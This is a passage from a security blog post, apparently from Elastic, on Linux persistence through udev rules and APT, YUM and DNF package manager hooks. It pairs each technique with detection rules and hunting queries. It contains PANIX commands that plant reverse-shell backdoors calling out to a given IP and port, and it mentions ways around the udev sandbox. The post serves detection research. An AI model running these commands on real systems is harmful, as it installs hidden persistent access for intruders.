or use the \",(0,t.jsx)(e.a,{href:\"https://www.man7.org/linux/man-pages/man8/udevadm.8.html\",rel:\"nofollow\",children:\"udevadm\"}),\" trigger utility.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`sudo udevadm trigger -v\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Additionally, these drivers can be monitored using \",(0,t.jsx)(e.code,{children:\"udevadm\"}),\", by running:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`udevadm monitor --environment\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Eder\\u2019s \",(0,t.jsx)(e.a,{href:\"https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/\",rel:\"nofollow\",children:\"blog\"}),\" titled \\u201CLeveraging Linux udev for persistence\\u201D is a very good read for more information on this topic. This technique has several limitations, making it more difficult to leverage the persistence mechanism.\"]}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:\"Udev rules are limited to short foreground tasks due to potential blocking of subsequent events.\"}),`\n`,(0,t.jsxs)(e.li,{children:[\"They cannot execute programs accessing networks or filesystems, enforced by \",(0,t.jsx)(e.code,{children:\"systemd-udevd.service\"}),\"'s sandbox.\"]}),`\n`,(0,t.jsx)(e.li,{children:\"Long-running processes are terminated after event handling.\"}),`\n`]}),`\n`,(0,t.jsx)(e.p,{children:\"Despite these restrictions, bypasses include creating detached processes outside udev rules for executing implants, such as:\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[\"Leveraging \",(0,t.jsx)(e.code,{children:\"at\"}),\"/\",(0,t.jsx)(e.code,{children:\"cron\"}),\"/\",(0,t.jsx)(e.code,{children:\"systemd\"}),\" for independent scheduling.\"]}),`\n`,(0,t.jsx)(e.li,{children:\"Injecting code into existing processes.\"}),`\n`]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Although persistence would be set up through a different technique than udev, udev would still grant a persistence mechanism for the \",(0,t.jsx)(e.code,{children:\"at\"}),\"/\",(0,t.jsx)(e.code,{children:\"cron\"}),\"/\",(0,t.jsx)(e.code,{children:\"systemd\"}),\" persistence mechanism. MITRE does not have a technique dedicated to this mechanism \\u2014 the most logical technique to add this to would be \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1546/\",rel:\"nofollow\",children:\"T1546\"}),\".\"]}),`\n`,(0,t.jsxs)(e.p,{children:['Researchers from AON recently discovered a malware called \"sedexp\" that achieves persistence using Udev rules - a technique rarely seen in the wild - so be sure to check out ',(0,t.jsx)(e.a,{href:\"https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp\",rel:\"nofollow\",children:\"their research article\"}),\".\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"persistence-through-t1546---udev\",children:\"Persistence through T1546 - udev\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"PANIX allows you to test all three techniques by leveraging \",(0,t.jsx)(e.code,{children:\"--at\"}),\", \",(0,t.jsx)(e.code,{children:\"--cron\"}),\" and \",(0,t.jsx)(e.code,{children:\"--systemd\"}),\", respectively. Or go ahead and test it manually. We can set up udev persistence through \",(0,t.jsx)(e.code,{children:\"at\"}),\", by running the following command:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`\u003e sudo ./panix.sh --udev --default --ip 192.168.1.1 --port 2009 --at\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"To trigger the payload, you can either run \",(0,t.jsx)(e.code,{children:\"sudo udevadm trigger\"}),\" or reboot the system. Let\\u2019s analyze the events in Discover.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image16.png\",alt:\"Events generated as a result of Udev At persistence establishment\",title:\"Events generated as a result of Udev At persistence establishment\",width:\"1859\",height:\"1385\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"In the figure above, PANIX is executed, which creates the \",(0,t.jsx)(e.code,{children:\"/usr/bin/atest\"}),\" backdoor and grants it execution permissions. Subsequently, the \",(0,t.jsx)(e.code,{children:\"10-atest.rules\"}),\" file is generated, and the drivers are reloaded and triggered. This causes \",(0,t.jsx)(e.code,{children:\"At\"}),\" to be spawned as a child process of \",(0,t.jsx)(e.code,{children:\"udevadm\"}),\", creating the \",(0,t.jsx)(e.code,{children:\"atspool\"}),\"/\",(0,t.jsx)(e.code,{children:\"atjob\"}),\", and subsequently executing the reverse shell.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Cron follows a similar structure; however, it is slightly more difficult to catch the malicious activity, as the child process of \",(0,t.jsx)(e.code,{children:\"udevadm\"}),\" is \",(0,t.jsx)(e.code,{children:\"bash\"}),\", which is not unusual.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image5.png\",alt:\"Events generated as a result of Udev Cron persistence establishment\",title:\"Events generated as a result of Udev Cron persistence establishment\",width:\"1859\",height:\"1485\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Finally, when looking at the documents generated by Udev in combination with Systemd, we see the following:\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image9.png\",alt:\"Events generated as a result of Udev Systemd persistence establishment\",title:\"Events generated as a result of Udev Systemd persistence establishment\",width:\"1789\",height:\"622\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Which also does not show a relationship with udev, other than the \",(0,t.jsx)(e.code,{children:\"12-systemdtest.rules\"}),\" file that is created.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"This leads these last two mechanisms to be detected through our previous systemd/cron related rules, rather than specific udev rules. Let\\u2019s take a look at the coverage (We omitted the \",(0,t.jsx)(e.code,{children:\"systemd\"}),\"/\",(0,t.jsx)(e.code,{children:\"cron\"}),\" rules, as these were already mentioned in \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:\"the previous persistence blog\"}),\"):\"]}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{children:\"Category\"}),(0,t.jsx)(e.th,{children:\"Coverage\"})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_udev_rule_creation.toml\",rel:\"nofollow\",children:\"Systemd-udevd Rule File Creation\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Process\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_at_utility_launched_through_udevadm.toml\",rel:\"nofollow\",children:\"At Utility Launched through Udevadm\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml\",rel:\"nofollow\",children:\"Executable Bit Set for Potential Persistence Script\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Network\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_udev_execution_followed_by_egress_network_connection.toml\",rel:\"nofollow\",children:\"Udev Execution Followed by Egress Network Connection\"})})]})]})]})}),`\n`,(0,t.jsx)(e.h3,{id:\"hunting-for-t1546---udev\",children:\"Hunting for T1546 - udev\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Hunting for Udev persistence can be conducted through ES|QL and OSQuery. By leveraging ES|QL, we can detect unusual file creations and process executions, and through OSQuery we can do live hunting on our managed systems. To get you started, we created the \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_udev.toml\",rel:\"nofollow\",children:\"Persistence via Udev\"}),\" rule, containing several different queries.\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"t1546016---event-triggered-execution-installer-packages\",children:\"T1546.016 - event triggered execution: installer packages\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Package managers are tools responsible for installing, updating, and managing software packages. Three widely used package managers are \",(0,t.jsx)(e.a,{href:\"https://linux.die.net/man/8/apt\",rel:\"nofollow\",children:\"APT\"}),\" (Advanced Package Tool), \",(0,t.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man8/yum.8.html\",rel:\"nofollow\",children:\"YUM\"}),\" (Yellowdog Updater, Modified), and YUM\\u2019s successor, \",(0,t.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man8/dnf.8.html\",rel:\"nofollow\",children:\"DNF\"}),\" (Danified YUM). Beyond their legitimate uses, these tools can be leveraged by attackers to establish persistence on a system by hijacking the package manager execution flow, ensuring malicious code is executed during routine package management operations. MITRE details information related to this technique under the identifier \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1546/016/\",rel:\"nofollow\",children:\"T1546.016\"}),\".\"]}),`\n`,(0,t.jsx)(e.h3,{id:\"t1546016---installer-packages-apt\",children:\"T1546.016 - installer packages (APT)\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://linux.die.net/man/8/apt\",rel:\"nofollow\",children:\"APT\"}),\" is the default package manager for Debian-based Linux distributions like Debian, Ubuntu, and their derivatives. It simplifies the process of managing software packages and dependencies. APT utilizes several configuration mechanisms to customize its behavior and enhance package management efficiency.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://manpages.debian.org/testing/apt/apt.conf.5.en.html\",rel:\"nofollow\",children:\"APT hooks\"}),\" allow users to execute scripts or commands at specific points during package installation, removal, or upgrade operations. These hooks are stored in \",(0,t.jsx)(e.code,{children:\"/etc/apt/apt.conf.d/\"}),\" and can be leveraged to execute actions pre- and post-installation. The structure of APT configuration files follows a numeric ordering convention to control the application of configuration snippets that customize various aspects of APT's behavior. A regular APT hook looks like this:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`DPkg::Post-Invoke {\"if [ -d /var/lib/update-notifier ]; then touch /var/lib/update-notifier/dpkg-run-stamp; fi; /usr/lib/update-notifier/update-motd-updates-available 2\u003e/dev/null || true\";};                                                                            APT::Update::Post-Invoke-Success {\"/usr/lib/update-notifier/update-motd-updates-available 2\u003e/dev/null || true\";}; \n`})}),`\n`,(0,t.jsx)(e.p,{children:\"These configuration files can be exploited by attackers to execute malicious binaries or code whenever an APT operation is executed. This vulnerability extends to automated processes like auto-updates, enabling persistent execution on systems with automatic update features enabled.\"}),`\n`,(0,t.jsx)(e.h4,{id:\"persistence-through-t1546016---installer-packages-apt\",children:\"Persistence through T1546.016 - installer packages (APT)\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"To test this method, a Debian-based system that leverages APT or the manual installation of APT is required. Make sure that if you perform this step manually, that you do not break the APT package manager, as \",(0,t.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2021C4-L2021C138\",rel:\"nofollow\",children:\"a carefully crafted payload\"}),\" that detaches and runs in the background is necessary to not interrupt the execution chain. You can setup APT persistence by running:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`\u003e sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2012 --apt\n\u003e [+] APT persistence established\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"To trigger the payload, run an APT command, such as \",(0,t.jsx)(e.code,{children:\"sudo apt update\"}),\". This will spawn a reverse shell. Let\\u2019s take a look at the events in Discover:\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image10.png\",alt:\"Events generated as a result of package manager (APT) persistence establishment\",title:\"Events generated as a result of package manager (APT) persistence establishment\",width:\"2015\",height:\"706\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"In the figure above, we see PANIX being executed, creating the \",(0,t.jsx)(e.code,{children:\"01python-upgrades\"}),\" file, and successfully establishing the APT hook. After running \",(0,t.jsx)(e.code,{children:\"sudo apt update\"}),\", APT reads the configuration file and executes the payload, initiating the \",(0,t.jsx)(e.code,{children:\"sh\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"nohup\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"setsid\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"bash\"}),\" reverse shell chain. Our coverage is multi-layered, and detects the following events:\"]}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{children:\"Category\"}),(0,t.jsx)(e.th,{children:\"Coverage\"})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_file_creation.toml\",rel:\"nofollow\",children:\"APT Package Manager Configuration File Creation\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Process\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_execution.toml\",rel:\"nofollow\",children:\"Suspicious APT Package Manager Execution\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_apt_package_manager_command_execution.toml\",rel:\"nofollow\",children:\"APT Package Manager Command Execution\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Network\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_netcon.toml\",rel:\"nofollow\",children:\"Suspicious APT Package Manager Network Connection\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_apt_package_manager_egress_network_connection.toml\",rel:\"nofollow\",children:\"APT Package Manager Egress Network Connection\"})})]})]})]})}),`\n`,(0,t.jsx)(e.h3,{id:\"t1546016---installer-packages-yum\",children:\"T1546.016 - installer packages (YUM)\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man8/yum.8.html\",rel:\"nofollow\",children:\"YUM\"}),\" (Yellowdog Updater, Modified) is the default package management system used in Red Hat-based Linux distributions like CentOS and Fedora. YUM employs \",(0,t.jsx)(e.a,{href:\"https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins\",rel:\"nofollow\",children:\"plugin architecture\"}),\" to extend its functionality, allowing users to integrate custom scripts or programs that execute at various stages of the package management lifecycle. These plugins are stored in specific directories and can perform actions such as logging, security checks, or custom package handling.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"The structure of YUM plugins typically involves placing them in directories like:\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"/etc/yum/pluginconf.d/\"}),\" (for configuration files)\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"/usr/lib/yum-plugins/\"}),\" (for plugin scripts)\"]}),`\n`]}),`\n`,(0,t.jsxs)(e.p,{children:[\"For plugins to be enabled, the \",(0,t.jsx)(e.code,{children:\"/etc/yum.conf\"}),\" file must have the \",(0,t.jsx)(e.code,{children:\"plugins=1\"}),\" set. These plugins can intercept YUM operations, modify package installation behaviors, or execute additional actions before or after package transactions. YUM plugins are quite extensive, but a basic YUM plugin template might look like \",(0,t.jsx)(e.a,{href:\"http://yum.baseurl.org/wiki/WritingYumPlugins.html\",rel:\"nofollow\",children:\"this\"}),\":\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\n\nrequires_api_version = '2.3'\nplugin_type = (TYPE_CORE, TYPE_INTERACTIVE)\n\ndef init_hook(conduit):\n    conduit.info(2, 'Hello world')\n\ndef postreposetup_hook(conduit):\n    raise PluginYumExit('Goodbye')\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Each plugin must be enabled through a \",(0,t.jsx)(e.code,{children:\".conf\"}),\" configuration file:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`[main]                                                                                                                               enabled=1\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"Similar to APT's configuration files, YUM plugins can be leveraged by attackers to execute malicious code during routine package management operations, particularly during automated processes like system updates, thereby establishing persistence on vulnerable systems.\"}),`\n`,(0,t.jsx)(e.h4,{id:\"persistence-through-t1546016---installer-packages-yum\",children:\"Persistence through T1546.016 - Installer Packages (YUM)\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Similar to APT, YUM plugins should be crafted carefully to not interfere with the YUM update execution flow. Use \",(0,t.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2025-L2047\",rel:\"nofollow\",children:\"this example\"}),\" or set it up by running:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`\u003e sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2012 --yum\n[+] Yum persistence established\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"After planting the persistence mechanism, a command similar to \",(0,t.jsx)(e.code,{children:\"sudo yum upgrade\"}),\" can be run to establish a reverse connection.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image1.png\",alt:\"Events generated as a result of package manager (YUM) persistence establishment\",title:\"Events generated as a result of package manager (YUM) persistence establishment\",width:\"2011\",height:\"796\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"We see PANIX being executed, \",(0,t.jsx)(e.code,{children:\"/usr/lib/yumcon\"}),\", \",(0,t.jsx)(e.code,{children:\"/usr/lib/yum-plugins/yumcon.py\"}),\" and \",(0,t.jsx)(e.code,{children:\"/etc/yum/pluginconf.d/yumcon.conf\"}),\" being created. \",(0,t.jsx)(e.code,{children:\"/usr/lib/yumcon\"}),\" is executed by \",(0,t.jsx)(e.code,{children:\"yumcon.py\"}),\", which is enabled in \",(0,t.jsx)(e.code,{children:\"yumcon.conf\"}),\". After updating the system, the reverse shell execution chain (\",(0,t.jsx)(e.code,{children:\"yum\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"sh\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"setsid\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"yumcon\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"python\"}),\") is executed. Similar to APT, our YUM coverage is multi-layered, and detects the following events:\"]}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{children:\"Category\"}),(0,t.jsx)(e.th,{children:\"Coverage\"})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_yum_package_manager_plugin_file_creation.toml\",rel:\"nofollow\",children:\"Yum Package Manager Plugin File Creation\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Process\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_yum_dnf_plugin_detection.toml\",rel:\"nofollow\",children:\"Yum/DNF Plugin Status Discovery\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Network\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_connection_by_a_yum_package_manager_descendant.toml\",rel:\"nofollow\",children:\"Egress Connection by a YUM Package Manager Descendant\"})})]})]})]})}),`\n`,(0,t.jsx)(e.h3,{id:\"t1546016---installer-packages-dnf\",children:\"T1546.016 - installer packages (DNF)\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man8/dnf.8.html\",rel:\"nofollow\",children:\"DNF\"}),\" (Dandified YUM) is the next-generation package manager used in modern Red Hat-based Linux distributions, including Fedora and CentOS. It replaces YUM while maintaining compatibility with YUM repositories and packages. Similar to YUM, DNF utilizes a \",(0,t.jsx)(e.a,{href:\"https://docs.redhat.com/it/documentation/red_hat_enterprise_linux/9/html/managing_software_with_the_dnf_tool/assembly_configuring-yum_managing-software-with-the-dnf-tool#proc_enabling-and-disabling-yum-plug-ins_assembly_configuring-yum\",rel:\"nofollow\",children:\"plugin system\"}),\" to extend its functionality, enabling users to integrate custom scripts or programs that execute at key points in the package management lifecycle.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"DNF plugins enhance its capabilities by allowing customization and automation beyond standard package management tasks. These plugins are stored in specific directories:\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"/etc/dnf/pluginconf.d/\"}),\" (for configuration files)\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"/usr/lib/python3.9/site-packages/dnf-plugins/\"}),\" (for plugin scripts)\"]}),`\n`]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Of course the location for the dnf-plugins are bound to the Python version that is running on your system. Similarly to YUM, to enable a plugin, \",(0,t.jsx)(e.code,{children:\"plugins=1\"}),\" must be set in \",(0,t.jsx)(e.code,{children:\"/etc/dnf/dnf.conf\"}),\". An example of a DNF plugin can look like this:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`import dbus\nimport dnf\nfrom dnfpluginscore import _\n\nclass NotifyPackagekit(dnf.Plugin):\n\tname = \"notify-packagekit\"\n\n\tdef __init__(self, base, cli):\n\t\tsuper(NotifyPackagekit, self).__init__(base, cli)\n\t\tself.base = base\n\t\tself.cli = cli\n\tdef transaction(self):\n\t\ttry:\n\t\t\tbus = dbus.SystemBus()\n\t\t\tproxy = bus.get_object('org.freedesktop.PackageKit', '/org/freedesktop/PackageKit')\n\t\t\tiface = dbus.Interface(proxy, dbus_interface='org.freedesktop.PackageKit')\n\t\t\tiface.StateHasChanged('posttrans')\n\t\texcept:\n\t\t\tpass \n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"As for YUM, each plugin must be enabled through a \",(0,t.jsx)(e.code,{children:\".conf\"}),\" configuration file:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`[main]                                                                                                                               enabled=1\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"Similar to YUM's plugins and APT's configuration files, DNF plugins can be exploited by malicious actors to inject and execute unauthorized code during routine package management tasks. This attack vector extends to automated processes such as system updates, enabling persistent execution on systems with DNF-enabled repositories.\"}),`\n`,(0,t.jsx)(e.h4,{id:\"persistence-through-t1546016---installer-packages-dnf\",children:\"Persistence through T1546.016 - installer packages (DNF)\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Similar to APT and YUM, DNF plugins should be crafted carefully to not interfere with the DNF update execution flow. You can use the following \",(0,t.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2049-L2069\",rel:\"nofollow\",children:\"example\"}),\" or set it up by running:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`\u003e sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2013 --dnf\n\u003e [+] DNF persistence established\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Running a command similar to \",(0,t.jsx)(e.code,{children:\"sudo dnf update\"}),\" will trigger the backdoor. Take a look at the events:\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image12.png\",alt:\"Events generated as a result of package manager (DNF) persistence establishment\",title:\"Events generated as a result of package manager (DNF) persistence establishment\",width:\"2006\",height:\"1177\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"After the execution of PANIX, \",(0,t.jsx)(e.code,{children:\"/usr/lib/python3.9/site-packages/dnfcon\"}),\", \",(0,t.jsx)(e.code,{children:\"/etc/dnf/plugins/dnfcon.conf\"}),\" and \",(0,t.jsx)(e.code,{children:\"/usr/lib/python3.9/site-packages/dnf-plugins/dnfcon.py\"}),\" are created, and the backdoor is established. These locations are dynamic, based on the Python version in use. After triggering it through the \",(0,t.jsx)(e.code,{children:\"sudo dnf update\"}),\" command, the \",(0,t.jsx)(e.code,{children:\"dnf\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"sh\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"setsid\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"dnfcon\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"python\"}),\" reverse shell chain is initiated. Similar to before, our DNF coverage is multi-layered, and detects the following events:\"]}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{children:\"Category\"}),(0,t.jsx)(e.th,{children:\"Coverage\"})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_dnf_package_manager_plugin_file_creation.toml\",rel:\"nofollow\",children:\"DNF Package Manager Plugin File Creation\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Process\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_yum_dnf_plugin_detection.toml\",rel:\"nofollow\",children:\"Yum/DNF Plugin Status Discovery\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Network\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_connection_by_a_dnf_package_manager_descendant.toml\",rel:\"nofollow\",children:\"Egress Connection by a DNF Package Manager Descendant\"})})]})]})]})}),`\n`,(0,t.jsx)(e.h3,{id:\"hunting-for-persistence-through-t1546016---installer-packages\",children:\"Hunting for persistence through T1546.016 - installer packages\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Hunting for Package Manager persistence can be conducted through ES|QL and OSQuery. Indicators of compromise may include configuration and plugin file creations/modifications and unusual executions of APT/YUM/DNF parents. The \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_package_manager.toml\",rel:\"nofollow\",children:\"Persistence via Package Manager\"}),\" rule contains several ES|QL/OSQuery queries that you can use to detect these abnormalities.\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"t1546---event-triggered-execution-git\",children:\"T1546 - event triggered execution: 